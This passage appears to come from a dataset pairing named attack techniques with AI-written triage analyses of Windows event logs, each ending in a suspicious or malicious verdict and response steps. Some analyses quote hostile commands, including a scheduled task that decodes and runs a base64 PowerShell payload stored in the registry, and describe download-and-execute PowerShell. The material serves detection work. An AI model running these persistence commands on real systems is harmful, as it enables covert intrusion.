The activities observed in the logs demonstrate strong indicators of malicious behavior. The time skew, combined with unauthorized account manipulation via PowerShell script, signifies a potential compromise where an attacker may be attempting to gain administrative control or persistence within the system.

### Resolution

- **MALICIOUS**: The activities present in the logs are categorized as malicious. Immediate action should be taken to isolate the affected system to prevent further potential compromise and conduct a deeper forensic investigation to understand the full scope and impact.

### Guidance

1. **Isolate the System**: Disconnect the network connection to prevent further unauthorized access and data exfiltration.
  
2. **Forensic Analysis**: Perform a detailed forensic examination to uncover all unauthorized actions, determine the source of the compromise, and assess the extent of affected systems.

3. **User Account Review**: Check all user accounts for unauthorized changes, especially those with administrative privileges.

4. **Log Integrity Verification**: Examine logs for any signs of alteration and ensure appropriate time settings across the network.

5. **Implement Remedial Measures**: Apply necessary security patches, update antivirus definitions, and review firewall and intrusion detection/prevention system settings.

6. **Incident Report and Response**: Report the incident to appropriate authorities and security teams, and follow the organization's incident response plan to contain and remediate the incident.

By addressing these actions, the organization can mitigate the risk posed by this identified malicious activity in the logs."
Scheduled task Local,"**Detailed Analysis of Windows Event Logs:**

Upon reviewing the provided Sysmon, Security, and Application logs, here are the findings:

1. **Repeated use of Wevtutil and Conhost:**
   - The `wevtutil.exe` process is frequently executed by `SERVER002\\admin_test`. The tool `wevtutil.exe` is usually used to manage Windows Event Logs (viewing, clearing, exporting logs, etc.). 
   - `conhost.exe` is the Console Window Host and frequently appears alongside `wevtutil.exe` without any command-line arguments provided in the logs.

2. **Execution of Standard Utilities:**
   - Utilities such as `hostname.exe` and `whoami.exe` are executed. `whoami.exe` is a utility that provides information about the currently logged-in user. These utilities are being launched under the context of `SERVER002\\admin_test` with high integrity levels but appear to be benign in isolation.

3. **Suspicious Process Creation with SCHTASKS:**
   - A command is executed to create a scheduled task using `schtasks.exe`, which is set to run `cmd.exe`. The command is: 
     ```
     cmd.exe /c SCHTASKS /Create /SC ONCE /TN spawn /TR C:\windows\system32\cmd.exe /ST 20:10
     ```
   - The creation of a scheduled task for executing a command immediately or at a specific time may be indicative of an attempt to persist unauthorized activity or execute malicious scripts at a predefined time.

4. **Security Privileges Granted:**
   - The account `admin_test` is granted numerous high-privilege rights, including `SeDebugPrivilege`, `SeBackupPrivilege`, and others. This user has significant system-level privileges which can be potentially exploited.

5. **Logon Events:**
   - There are multiple logon events for the user `admin_test`, from two different IPv6 addresses, which could suggest potentially suspicious logins or use of credentials, especially if unexpected from usual behavior patterns.

6. **Miscellaneous Network Service Processes:**
   - Processes such as `sppsvc.exe`, `WmiPrvSE.exe`, `MicrosoftEdgeUpdate.exe`, and `TrustedInstaller.exe` are executed under system accounts like `NT AUTHORITY\\NETWORK SERVICE` or `SYSTEM`. These appear standard and part of typical Windows operations.

**Assessment:**

Based on the evidence present in the logs, the most suspicious activity is the creation of a scheduled task using `schtasks.exe` to run a command without a user-visible window, potentially indicating malicious intent or an attempt to maintain persistence on the system. The frequent invocation of system utilities like `wevtutil.exe` could suggest log manipulation, especially if intended to cover tracks.

Additionally, high-privilege allocation to the user `admin_test` alongside multiple logon events from different IP addresses is concerning and could imply credential misuse or unauthorized access.

**Resolution:**

- **SUSPICIOUS**

**Guidance on how to Proceed:**

1. **Further Investigation:**
   - Perform a deeper investigation into the log entries surrounding the creation of scheduled tasks to determine their origin and purpose.
   - Check the authenticity and intent behind multiple `SERVER002\\admin_test` logins from different IP addresses.

2. **Immediate Actions:**
   - Review user access control and permissions, specifically for `admin_test`, ensuring minimal privileges necessary.
   - Conduct a security audit on other systems and logs for associated anomalies.

3. **Preventive Measures:**
   - Implement strict monitoring and alerting for high-privilege actions and unusual command executions like scheduled task creation.
   - Regularly review and audit user privileges, enforcing the principle of least privilege.

Given the potential implications of the suspicious task scheduling, a cautious approach with further verification is advised."
Process Injection with Go using CreateThread WinAPI,"Based on the provided logs, let's analyze the entries from the Application, PowerShell, Security, Sysmon, and System logs for any indicators of suspicious or malicious activity.

### Detailed Analysis:

1. **Application Log:**
   - The logs show standard operations such as the Security Product State being 'on' for Windows Defender and typical operation of the Software Protection Platform (SPP) service. There is nothing suspicious in these log entries.

2. **Windows PowerShell Log:**
   - There are multiple PowerShell events with command lines running `CreateThread.exe` from a temporary directory. The use of `CreateThread.exe` and execution from a temp directory signifies potentially suspicious behavior, as PowerShell is often used for scripting and automation that attackers might exploit, particularly if binaries are run from non-standard locations.

3. **Security Log:**
   - Event ID 4616 indicates a time change, which should generally be rare or logged with a specific reason. However, this alone, without context of why the time was changed, could be benign, especially if part of routine system maintenance. Both logs appear to be related to standard local service operations and do not directly indicate suspicious behavior if interpreted in isolation.

4. **Sysmon Log:**
   - Sysmon shows multiple events capturing standard system processes such as `wevtutil.exe` and `conhost.exe`. However, there is an important `CREATE` Event ID 1 with PowerShell running a `CreateThread.exe` in debug mode, consistent with the PowerShell log entries. This suggests potential malicious activity, as execution in debug mode is rare for legitimate operations. The involvement of process `CreateThread.exe` suggests an executable that isn’t a known, authorized application.

5. **System Log:**
   - The system log entries indicate a straightforward update process and time adjustment possibly due to time synchronization with an NTP server. No immediate threat detected here.

### Assessment:

- **Suspicious Items:**
  - The PowerShell execution and Sysmon logs provide a reason to suspect potentially malicious actions. Execution from temporary directories, such as running `CreateThread.exe` with debug, is unusual and could be indicative of evasive techniques.

### Resolution:
- **SUSPICIOUS** - The logs contain suspicious activity, notably the execution of CreateThread.exe via PowerShell with a command from a temporary directory. There should be further investigation to confirm the authenticity and necessity of this execution. This involves checking if `CreateThread.exe` is an expected part of installed applications or scripts, its source, checking its hash against known malware databases, examining recent changes to scheduled tasks, and reviewing network connections associated with the involved processes.

### Guidance:
1. **Immediate Actions:**
   - Halt any suspicious processes if still active to prevent potential further harm.
   - Isolate the host from the network to prevent lateral movement.
   - Restore system time if the change was unauthorized and review NTP source configurations.

2. **Forensic Analysis:**
   - Validate the legitimacy of `CreateThread.exe`.
   - Check for related files or scripts in the same directory.
   - Analyze further logs for unusual user activities around the same timestamp.

3. **Remediation:**
   - Ensure all OS and security updates are current.
   - Enhance monitoring and introduce strict policies for script execution.
   - Conduct a comprehensive malware scan and cleanup as needed.

This resolution identifies that while no outright malicious behavior is confirmed yet, the actions taken could align with adversarial tactics, necessitating cautious investigation and handling."
Remote Service Installation CMD,"Upon analyzing the provided logs, here is a detailed assessment of the situation:

**Suspicious Activity Identified:**

1. **PowerShell Execution:**
   - The execution of `powershell.exe` by the user `SERVER002\admin_test` is noted. PowerShell, while a legitimate administration tool, can be used for malicious purposes if not closely monitored.

2. **Usage of `wevtutil.exe`:**
   - The frequent calling of `wevtutil.exe`, a utility typically used to manage event logs, by the user `SERVER002\admin_test` can signify attempts to clear or alter event logs, which can be a precursor to hiding malicious activity.

3. **Service Creation and Execution:**
   - The creation and starting of a service named `fileTestService_CMD` using `sc.exe` is observed. The service points to an executable located in a temporary directory: `C:\Users\ADMIN_~1\AppData\Local\Temp\file\data.003\bin\fileService.exe`. This is highly unusual, as services typically do not execute from temporary directories unless part of a software installation or update process.
   - The service is created with the account name `LocalSystem`, granting it high level privileges.

4. **Command Execution (`cmd.exe`) with Service Configuration:**
   - The presence of a command executed by `cmd.exe` to create and start the service `fileTestService_CMD` enhances suspicion. Such behavior could potentially be part of a persistence mechanism being established by a malicious entity.

**Indicators of Potential Compromise:**

- The events suggest an attempt to leverage administrative tools and privileges to execute commands, potentially indicating unauthorized activity.
- The combination of PowerShell usage, manipulation of event logs, and service creation in non-standard directories are common tactics in post-exploitation phases by malicious actors.

**Conclusion:**

- **Resolution: SUSPICIOUS**

Given the invocation and creation of a service from an unconventional path, especially with System privileges, and the clearing of event logs, further investigation is warranted. These activities might align with techniques used for stealthy persistence and data collection by attackers.

**Guidance:**

1. **Immediate Investigation:**
   - Verify the legitimacy of `fileService.exe` in the temporary directory. Match its hash against known safe applications or malware databases.
   - Check if `powershell.exe` and `wevtutil.exe` were used for legitimate administrative tasks or if they are linked to unauthorized actions.

2. **Access Log Verification:**
   - Review user `admin_test` activity logs to confirm if these actions are authorized under the user's role.

3. **Host Scanning:**
   - Run a thorough malware scan on the host system using up-to-date antivirus or anti-malware tools.

4. **Check for Persistence Mechanisms:**
   - Investigate other potential persistence mechanisms that could have been put in place by reviewing startup entries and scheduled tasks.

5. **Network Monitoring:**
   - Monitor network traffic for any anomalous connections from this host that could indicate data exfiltration or command-and-control communication.

These steps will help determine whether these events are indicative of benign administrative tasks or if a more sinister activity has taken place on the system."
Task Scheduler via VBA,"**Detailed Analysis**

Upon reviewing the provided Windows event logs, I have identified several indicators of potentially malicious activity, particularly related to PowerShell execution and Sysmon logs. Here is a detailed breakdown of these findings:

### PowerShell Event Logs
1. **Event ID 600**: Massive use of inline PowerShell commands to fetch and execute a script using `Invoke-Expression` (IEX) command with `Invoke-WebRequest` (iwr). This behavior is commonly seen in tactics where scripts are dynamically fetched and executed from remote servers, often used by attackers to run their malicious payloads without storing them on disk.
   
   - **Suspicious Behavior**: 
     - The use of `iwr` to download scripts directly from URLs, especially from publicly accessible platforms such as GitHub, raises red flags. The script is being fetched directly from a GitHub repository.
     - The PowerShell script seems to invoke another script using Office macros with potential malicious intent due to its invocation with `Word`.
   
### Sysmon Event Logs
2. **Process Creation Events (Event ID 1 and 5)**:
   - **PowerShell Execution**: The logs show multiple instances where `powershell.exe` is launched, reinforcing the activity noted in the PowerShell logs.
   - **Script Download and Execution**: The presence of a PowerShell process executing inline scripts with parameters that include downloading and executing further scripts is a significant indicator of malicious activity.

3. **Miscellaneous Processes**:
   - **wevtutil.exe Usage**: There are multiple instances of `wevtutil.exe` commands, which can be leveraged to clear event logs or manipulate logging behavior. This is suspicious, especially when coupled with script execution.

4. **User Context and Integrity Level**:
   - The `admin_test` user is consistently associated with high integrity level processes, suggesting local administrative privileges are potentially used for the execution of these suspicious scripts and commands.
  
### Assessment and Conclusion:

Based on the above analysis, the indicators point towards possible malicious activity:
- The use of PowerShell to fetch scripts dynamically from a URL.
- Execution of scripts with direct inputs from a location that appears to be suspicious.
- Multiple Sysmon entries showing the invocation of elevated command-line utilities like `wevtutil.exe` which could aid in cleaning up or altering logging data.
  
### Resolution:
**MALICIOUS** - The logs indicate a high likelihood of malicious activity, given the suspicious use of PowerShell to download and execute remote scripts, possible obfuscation or cleanup activity using `wevtutil`, and leveraging high-integrity processes.

### Guidance on How to Proceed:
1. **Immediate Containment**: Isolate the affected system ('Server002') from the network to prevent any possible lateral movement or data exfiltration.
2. **Comprehensive Forensic Analysis**: Obtain forensic images of the affected machine for deeper analysis of scripts, persistence mechanisms, and a thorough search for additional indicators of compromise.
3. **Expect Remediation Steps**: Reset credentials associated with affected user accounts, particularly `admin_test`, and assess other systems for similar behaviors or indicators of compromise.
4. **Enhance Monitoring and Logging**: Implement stricter monitoring of PowerShell activities and enhance logging to detect similar incidents in the future.
5. **Review and Update Security Policies**: Ensure security policies enforce the least privilege and restrict unauthorized access or execution of scripts from unverified sources."
Change Startup Folder - HKCU Modify User Shell Folders Startup Value,"Upon thorough analysis of the provided Windows event logs, several events stand out as potentially suspicious activities due to their characteristics, context, and the operations conducted:

1. **PowerShell Log Analysis:**
   - **PowerShell Command Execution:** 
     The command executed via PowerShell involves creating a directory in the temporary environment path, copying the `calc.exe` to this new directory, and then altering the registry to set this directory as a startup folder. This command sequence can be potentially malicious as it manipulates the startup settings of the system, potentially ensuring persistence for an undesirable application. This activity is suspicious as it involves registry modifications and the potential setup for persistence often associated with malicious behavior.

2. **Security Log Analysis:**
   - **Event ID 4616 (Time Change):** 
     There are two instances of a time change (Event ID 4616) noted in the security log within a very short timeframe. This could be a method used by attackers to cover their tracks or manipulate timestamps for the logs associated with an attack. While changing system time alone is not inherently malicious, coupled with other suspicious activities, it raises a red flag.
   - **Event ID 4624 and 4672 (Logon and Privilege Assignment):**
     The account `admin_test` is involved in a new logon session (LogonType 3 - Network Logon) and is granted special privileges (SeDebugPrivilege, SeTakeOwnershipPrivilege, etc.). These privileges are powerful and commonly targeted during a privilege escalation attack. The elevation of privileges is an indicator of potential malicious activity, especially if unusual for the account or context.

3. **Sysmon Log Analysis:**
   - **Process Execution:** 
     Numerous executions of system utilities such as `wevtutil.exe` and `conhost.exe` by `admin_test` are recorded in close succession. The `wevtutil.exe` is a command-line utility for managing Windows Event Logs and could be used to clear log events as part of anti-forensics measures by attackers.
   - **PowerShell Execution:** 
     The execution of `powershell.exe` with a command that copies a legitimate executable and modifies registry settings suggests a potentially malicious attempt to maintain persistence or conduct further attacks.

4. **Application and System Log:**
   - The `Application` and `System` logs do not show significant irregularities or direct indicators of malicious activity by themselves but contextualize the suspicious PowerShell activity indicating possible manipulation of software protection settings or time service configurations which can be part of a larger exploit.

**Assessment:**
- **Resolution: SUSPICIOUS**

The analyzed Windows event logs reflect suspicious activities suggesting potential malicious intentions:
- The modification of the system startup registry via PowerShell scripts, 
- Abnormal privilege assignments and network logons with high privileges,
- High integrity levels and rapid executions of sensitive processes by the user account `admin_test`.

These activities warrant further investigation to determine the legitimacy or malignancy of these operations. Steps should be taken to conduct a more detailed forensic analysis, corroborate with network logs, and verify authorized use, particularly surrounding the usage of `admin_test` account.

**Guidance:**
- Review user account `admin_test` for abnormal activity.
- Verify the necessity and legitimacy of registry modifications.
- Check for unauthorized network connections or data exfiltration.
- If not already done, isolate the system from the network for a deeper forensic investigation.
- Consider deploying stricter monitoring and logging policies for administrative actions."
Azure - adding user to Azure role in subscription,"Upon reviewing the provided logs from the Windows host, several indicators suggest suspicious behavior that may require further investigation.

**Suspicious Indicators:**

1. **Security Log (Event ID 4798 and 4799):**
   - There are multiple instances of ""C:\Windows\System32\CompatTelRunner.exe"" querying Group Membership (Event ID 4798) and Group Membership enumerations such as ""Administrators"" and ""Users"" (Event ID 4799). The `CompatTelRunner.exe` is typically associated with telemetry tasks by Microsoft, but its direct involvement in enumerating group memberships, including administrative accounts, raises a flag for potential misuse or masquerading by an attacker.
  
2. **Sysmon Log:**
   - **PowerShell Activity:** The Windows Sysmon log shows PowerShell execution running complex scripts which involve Azure role assignments and connections (Event ID 1). The script attempts to connect to Azure using credentials and assign roles to users. This activity can be typically seen in administration tasks; however, without proper context or authorization, such usage of PowerShell with administrative privileges could indicate a malicious attempt to escalate privileges or manipulate user roles in cloud services.
   
   - **Process Execution Patterns:** A pattern is seen where processes like `wevtutil.exe` and `conhost.exe` are executed multiple times by the user `SERVER002\\admin_test`. While these processes are legitimate, repeated execution might signify script automation or enumeration activity.

3. **Windows PowerShell Log:**
   - Detailed PowerShell script execution similar to the one observed in Sysmon logs. These scripts include operations such as importing modules, connecting to Azure accounts, querying users, and role assignments. Without legitimate context, this presents a potential security risk.

4. **Security Log (Event ID 4672):**
   - This event indicates that privileges like `SeDebugPrivilege`, `SeBackupPrivilege`, etc., were assigned to the `SYSTEM` account, suggesting a higher level of access being utilized. While this might be legitimate, if done in concert with suspicious activity, it might indicate privilege escalation.

**Assessment Summary:**
The combined execution of elevated commands, potentially unauthorized cloud account manipulation, group enumeration activities, and the use of PowerShell scripts suggest activities that do not look typical for regular operation and could indicate an attempt to compromise or misuse privileges on this host.

**Resolution: SUSPICIOUS**

**Recommendations:**
- Conduct a more detailed analysis of the user account `admin_test` and its activities.
- Review any legitimate use or expected operations involving Azure role assignments on this system.
- Investigate the specific PowerShell scripts to trace their origins and purpose.
- If possible, correlate these logs with network activity logs to identify any unusual external connections.
- Implement monitoring for `CompatTelRunner.exe` executions that involve group enumeration as part of user behavior analysis."
Scheduled Task Executing Base64 Encoded Commands From Registry,"Here is my detailed analysis of the Windows event logs:

### Analysis:

1. **Time Synchronization Events:**
   - Several events from the System log relate to time synchronization. These entries show that the system time was adjusted slightly backward (from 16:57:17.3978108 to 16:57:07.6826703) by the Windows Time Service (`svchost.exe`). This is typical behavior and does not indicate a compromise.

2. **Kernel-General and Security-Auditing Events:**
   - The `Microsoft-Windows-Kernel-General` and `Microsoft-Windows-Security-Auditing` logs show process executions with `svchost.exe` and time change events. They align with normal system operations related to time synchronization and do not indicate malicious activity.

3. **Sysmon Logs and Command Execution:**
   - The Sysmon logs reveal several instances of process creation, particularly involving `cmd.exe` and `reg.exe`, which are used to modify the registry with an encoded value. The command executed is: 
     ```plaintext
     cmd.exe /c reg add HKCU\SOFTWARE\file-data.005 /v test /t REG_SZ /d cGluZyAxMjcuMC4wLjE= /f & schtasks.exe /Create /F /TN ""file-data.005"" /TR ""cmd /c start /min \""\"" powershell.exe -Command IEX([System.Text.Encoding]::ASCII.GetString([System.Convert]::FromBase64String((Get-ItemProperty -Path HKCU:\\SOFTWARE\\file-data.005).test)))"" /sc daily /st 07:45
     ```
   - This command obfuscates a base64 payload and sets up a scheduled task to execute it via PowerShell, which is often indicative of malicious activity, such as attempts to achieve persistence.

4. **Other Logs:**
   - Other log entries, such as those involving `MicrosoftEdgeUpdate.exe` and standard system processes like `svchost.exe`, `sppsvc.exe`, `WmiPrvSE.exe`, `TrustedInstaller.exe`, and `TiWorker.exe`, appear routine and related to system updates and process management, showing no apparent signs of compromise.

### Assessment:

The presence of a command execution involving registry manipulation with base64 encoded data and subsequent task scheduling strongly suggests potentially malicious behavior. The use of `schtasks.exe` to run PowerShell with encoded content is a known method for attackers to establish persistence and execute further payloads discreetly.

### Resolution:

**MALICIOUS** - The log events point to potentially unauthorized modifications and execution commands that deviate from expected system operations, suggesting a likelihood of system compromise.

### Guidance on How to Proceed:

1. **Immediate Isolation:**
   - Isolate the affected machine from the network to prevent potential spread or further unauthorized activities.

2. **In-Depth Analysis:**
   - Conduct further investigation on the scheduled task and base64 encoded payload to determine the exact nature of the compromise.
   - Analyze PowerShell logs and retrieve the decoded content of the encoded payload.

3. **Incident Response:**
   - Engage your incident response team to assess the compromise, identify any data exfiltration, and trace potential attacker entry points.

4. **System Cleanup and Patching:**
   - Clean up the malicious entries and address any security vulnerabilities or misconfigurations that could have been exploited.

5. **User Accountability:**
   - Discuss with `admin_test` for any understanding of unusual activities or confirm unauthorized access usage.

6. **Monitoring and Prevention:**
   - Enhance monitoring for similar activities and employ prevention strategies, such as restricting unauthorized PowerShell execution and task scheduling through security policies.

Taking these actions is crucial to safeguard organizational assets and prevent further incidents."
Domain Password Policy Check: No Special Character in Password,"Upon analyzing the provided Windows event logs, here is the detailed analysis of potential suspicious or malicious activity:

### PowerShell Logs:
The PowerShell logs show attempts to read a credential file from the user's local app data directory and then perform a password change operation using the `Set-ADAccountPassword` command. Key observations:
- The PowerShell script is attempting to read a credential file (USER.txt) located at `$env:LOCALAPPDATA\file\$env:USERNAME.txt`.
- It checks if an existing credential file contains a stored password that matches the new password, which is not a recommended practice for password changes.
- If the password matches, the script issues a warning and exits, indicating that the password change did not go through.
- If any errors occur during the password change process, particularly an error code of 86 which suggests ""The username or password is incorrect,"" the script attempts to remove the credential file and exits.
- Storing clear-text passwords or even secure strings in local files is a security risk and can be an indicator of poor credential management practices.

### Sysmon Logs:
- It is noted that PowerShell.exe was executed by a user with admin privileges (User: `SERVER002\admin_test`), which corresponds with the time and actions observed in the PowerShell logs.
- Conhost.exe instances are related to console windows and are expected when executing command-line applications like PowerShell.
- Multiple instances of `wevtutil.exe` (Windows Event Utility) are running, which is used for querying or manipulating event logs. This could be benign if part of a system task or monitoring process, but could be suspicious if unnecessary logs are being deleted or manipulated.
- Usage of `whoami.exe` and `hostname.exe` seems routine for gaining user/session information.
- Additional system admin activity is seen through various system file updates, including Microsoft Edge Installer processes, suggesting updates or installations are being carried via trusted applications. The Edge setup seems routine with no apparent anomalies.

### Security Logs:
- The security logs (Event ID 4799) record a ""Security-Auditing"" event reflecting changes to group membership which involved the `Builtin\Users` group. This is performed by a process related to the Microsoft Edge Update, which might be part of a routine software installation process.

### Assessment:
1. **Suspicious PowerShell Execution**: The behavior of reading credential files, especially with operations that compare passwords in plaintext, is mildly suspicious and a potential security risk. However, without additional context on whether this script was intended for debugging or operational purpose, it may not definitively indicate malicious intent.
2. **Benign Sysmon Activities**: While there is a lot of activity around standard Microsoft tools like `wevtutil.exe`, `whoami.exe`, and Edge update processes executed by `svchost.exe`, none of these indicate malicious activity outright without further context showing misuse or abnormal behavior.
3. **Routine Edge Updates**: The observed activity from Edge installers and processes seems part of normal system maintenance.

### Conclusion:
- **Resolution**: **SUSPICIOUS**
  - The activity related to password handling and management via PowerShell warrants closer scrutiny, particularly with the storage and reuse of password data. While there is no strong evidence of a breach, it suggests an area needing improvement in security practices (e.g., credential safeguarding and scripting methods).
- **Recommended Action**:
  - Investigate the PowerShell script's origin and purpose—determine if it's legitimately maintained by IT staff or users.
  - Review and enhance password management practices and script security for sensitive operations.
  - Verify appropriate use of administrative privileges and process execution against expected operational patterns."
Bad Potato,"In analyzing the provided Windows event logs, we aim to identify any indicators of malicious activity. The logs reveal the following notable points:

### Analysis:

1. **Windows Security Health Service (EventID 1):**
   - The startup of `SecurityHealthService.exe`, a legitimate Windows service, indicates a benign system operation.

2. **PowerShell Usage (EventID 5 and 600 series):**
   - Multiple entries suggest the execution of PowerShell commands under the user `SERVER002\admin_test`.
   - Specifically, a command involving PowerShell (`Start-Process .\script.exe notepad.exe ...`) suggests script execution, along with the launching and termination of 'notepad.exe' and possibly another executable named 'script.exe'. While scripting and automation are common in administrative tasks, they can also be used by attackers for malicious activities.
   
3. **Wevtutil.exe Execution (EventID 5):**
   - The `wevtutil.exe` process was launched several times. `wevtutil.exe` is a legitimate utility for managing Windows event logs. Frequent execution may indicate log manipulation or clearing by a malicious user trying to cover tracks.
   
4. **Whoami.exe Executions (EventID 1):**
   - Execution of `whoami.exe` to identify the currently logged-on user can be considered typical but is sometimes used by attackers to gather information about user context post-compromise.
   
5. **Processes Executed by NT AUTHORITY\SYSTEM:**
   - Several processes like `svchost.exe`, `MicrosoftEdgeUpdate.exe`, and other Microsoft Edge components are executed with SYSTEM privileges. While this is normal for system processes and legitimate updates, it can also be leveraged in privilege escalation scenarios by malicious software.

6. **Behavioral Analysis:**
   - The initiated sequence involving PowerShell, potential script execution, and consistent execution of event log management utilities points towards potentially suspicious activity. The presence of `wsmprovhost.exe` as a parent process for PowerShell executions shows typical Windows Remote Management usage, which can be secured or exploited based on context.
   
### Conclusion:
The logs present ambiguous evidence due to legitimate system processes and actions executed under administrative contexts. However, the repeated execution of `wevtutil.exe` and combined usage of PowerShell with potential scripting reflect behaviors that could align with malicious activity, such as data collection, deployment of unauthorized scripts, and potential log clearance or tampering.

### Resolution: **SUSPICIOUS**
- While there isn't conclusive evidence of a specific malicious payload, the activity warrants further investigation due to the nature and context in which PowerShell and `wevtutil.exe` are employed alongside administrative privileges.

### Guidance:
1. **Immediate Steps:**
   - Verify the legitimacy of the `admin_test` user’s activities and whether these activities align with authorized scripts or administrative tasks.
   - Investigate scheduled tasks or other automation set by `admin_test` to trace script origins and purposes.

2. **Extended Investigation:**
   - Review network traffic logs during the period in question for any anomalies or outgoing connections to unknown IPs.
   - Examine recent changes to registry keys, scheduled tasks, and antivirus logs for any indicators of compromise (IOCs).

3. **If Unauthorized Activity is Suspected:**
   - Temporarily suspend/safeguard the user account to prevent further potential unauthorized changes.
   - Conduct a thorough endpoint security assessment to identify any additional points of compromise or persistence."
Add a driver,"Upon reviewing the provided Windows event logs, I have conducted an analysis focusing on potential indicators of malicious activity. Here is a detailed assessment:

### Sysmon Logs:
1. **Frequent use of `wevtutil.exe` and `conhost.exe`**:
   - `wevtutil.exe` is being executed frequently by the user `SERVER002\admin_test`. This utility can be used to query and manage event logs but its usage should be scrutinized, especially if it's used excessively or without a clear administrative purpose.
   - Paired with frequent executions of `conhost.exe` which acts as a console host for command-line executables, this could imply an attempt to disguise potentially malicious command-line activities.

2. **Execution of `pnputil.exe` with command-line arguments**:
   - The `cmd.exe` execution chain showing `pnputil.exe /add-driver ""C:\\Windows\\INF\\usbstor.inf""` suggests driver manipulation, potentially to add USB support or drivers. Depending on the context and user's role, this could be suspicious if not related to legitimate administrative action.

### Application, System, and Security Logs:
1. **Time Changes**:
   - The setting of system times is often associated with bypassing scheduled tasks or log analysis. The logs show time discrepancies adjusted by `svchost.exe`, which might be an administrative action but should be validated for legitimacy.
   
2. **MSP** and **WMI PRV SE** usage with `NT AUTHORITY\NETWORK SERVICE`:
   - The processes `sppsvc.exe` and `WmiPrvSE.exe` executed by `NETWORK SERVICE` are typically legitimate, performing regular Windows Maintenance tasks like software protection services and WMI provider operations.

### Observations and Conclusion:
- The observed activity, particularly the excessive use of `wevtutil.exe` and command execution calling `pnputil.exe` to manage drivers, can be suspicious if not directly related to legitimate administrative purposes.
- The time discrepancies should be investigated to ensure that they align with any known maintenance or administrative actions, as such changes can potentially obfuscate malicious activities.

### Resolution:
**SUSPICIOUS**

The activities noted, especially the command executions and event log querying, while possibly benign in certain contexts, warrant further investigation to rule out misuse or malicious intent. It's crucial to verify:
- The legitimacy of the `admin_test` actions and whether they align with their job role.
- Any correlating events or alerts around these timestamps for additional malicious indicators.
- Approval and documentation concerning the time changes and driver installations.

Immediate actions should include informing IT or the security team about these findings, validating with the user or the responsible admin for context, and possibly increasing monitoring around events involving `wevtutil.exe`, `cmd.exe` with `pnputil.exe`, and time-setting operations on the system."
Named pipe client impersonation,"Upon analyzing the provided Windows event logs from the Application, Windows PowerShell, Security, Sysmon, and System logs of the Server002, the following observations are made:

### 1. **Application Logs**
- The logs indicate Windows Defender is turned on, showing a normal security state for the system. These entries are benign in nature.

### 2. **Windows PowerShell Logs**
- The log entries display suspicious use of PowerShell, which includes execution from the command line of a script hosted externally (from raw.githubusercontent.com). The command uses `IWR` (Invoke-WebRequest) to fetch and execute a script aimed at potential privilege escalation (`privesc/script.ps1`). This behavior is highly indicative of malicious activity due to:
  - Use of `IEX` (Invoke-Expression) which is often leveraged for executing scripts in memory to avoid detection.
  - Named pipe technique mentioned may indicate stealthy communication or data exchange attempts.

### 3. **Security Logs**
- There are logs related to event ID 4672, which shows privilege assignment for the `admin_test` account. These privileges contain high-level access such as `SeDebugPrivilege` and `SeBackupPrivilege`, which can be abused for privilege escalation and lateral movement.
- Event ID 4624 shows successful logons using the NTLM authentication protocol from a potential external workstation, further indicating a probable unauthorized access attempt or exploitation.

### 4. **Sysmon Logs**
- The execution of processes such as `powershell.exe` with a suspicious command line confirms the execution of the potentially malicious PowerShell script.
- Several logs show the usage of `wevtutil.exe` and `conhost.exe`, common tools which could be used legitimately but also for malicious purposes such as clearing logs or hiding tracks.

### 5. **System Logs**
- There's evidence of time change events (`EventID 1` and `EventID 24`) which may indicate manipulation to disrupt log analysis.

### **Assessment**
The logs indicate clear signs of potentially malicious activities, primarily focused on PowerShell execution from a remote source, privilege escalation attempts, suspicious logon activities, and suspicious process executions. These are classic indicators of compromise.

### **Resolution**
**MALICIOUS** - The combination of direct script execution from an external source, privilege escalation indicators, and suspicious logon activities strongly indicates a compromise of the host.

### **Guidance**
Immediate response actions should include:
1. Isolate the affected machine to prevent further lateral movement.
2. Initiate an incident response plan to assess the extent of the compromise.
3. Review and terminate any unauthorized access and sessions.
4. Prioritize mitigating credential theft and privilege escalation on affected systems.
5. Conduct a comprehensive forensic analysis to understand the full scope of the infiltration and implement preventive security measures to protect against future incidents.
6. Consider reporting the incident to appropriate authorities if this breach pertains to organizational policy or compliance requirements."
RunPE via VBA,"Based on the provided logs, let's analyze the key points and indicators of possible malicious activity:

### Security Logs:
1. **Event ID 4624 (Logon) and 4672 (Special Privilege Assigned):**
   - Multiple occurrences of these events show SYSTEM-level logons and privileges for the SERVER002 machine account (`SERVER002$`), which is common in normal operation but should be contextualized with other activities.
   - The events show privileges typically assigned to SYSTEM, such as `SeDebugPrivilege`, `SeTcbPrivilege`, indicating a high level of access.

2. **Event ID 5379 (Credential Validation):**
   - The logs frequently mention `MicrosoftAccount:user=02txoixylodcstop`, but the credential validation always results in failure (`ReturnCode=3221226021`). This could indicate repeated failed attempts to use or verify these credentials.

3. **Event ID 4798 (Enumerate Local Group Memberships):**
   - Multiple events with the same subject suggest attempts to enumerate group memberships. While `SERVER002$` trying different accounts like `Administrator`, `admin_test`, etc., could be normal for service accounts, it's unusual without a clear reason.

### PowerShell Logs:
- The PowerShell logs exhibit potentially malicious activity. The script:
  - Downloads and executes a script from a public GitHub repository using the `Invoke-WebRequest` (iwr) and `Invoke-Expression` (IEX) cmdlets.
  - This type of execution is a red flag, common in PowerShell-based attacks like downloader or execution of potentially harmful scripts.

### Sysmon Logs:
1. **Process Creation:**
   - Sysmon logs further confirm the execution of PowerShell with external script downloading, reinforcing the suspicious nature.
   - Processes such as `wevtutil.exe` exporting logs or `sc.exe` starting services could be legitimate but might be associated with lateral movements or persistent setups when combined with malicious scripting activities.

2. **Process Hierarchy:**
   - PowerShell and `wevtutil.exe` have unusual command lines and parent-child relationships indicating monitoring or data exfiltration attempts.
   - The use of `conhost.exe` for console hosting alongside suspicious activity suggests efforts to maintain persistence or manipulate logs.

### Assessment and Resolution:
After analyzing the logs, there are clear signs of potential malicious activities, specifically with unauthorized script executions, credential access attempts, and possible data exfiltration efforts via suspicious process executions. The activities suggest an unauthorized or a potentially malicious actor interacting with system processes and possibly attempting to hide or view system data.

### Final Resolution: MALICIOUS
- **Explanation:** The combination of failed credential events, unauthorized PowerShell script execution, suspicious process creations, and use of built-in tools like `wevtutil` outlined in the logs, particularly involving network-based script execution, indicates a high probability of malicious activity. Immediate investigation and incident response actions are recommended.
- **Guidance:** Initiate containment protocols to isolate the affected machine, conduct deeper forensic analysis on the server to understand the exploit vector, and review firewall and proxy logs to trace external connections, specifically to the GitHub-hosted script. Follow up with resetting potentially compromised accounts and patching vulnerabilities."
Reg Key RunOnce,"After analyzing the provided logs, here is a detailed breakdown:

### Security Log
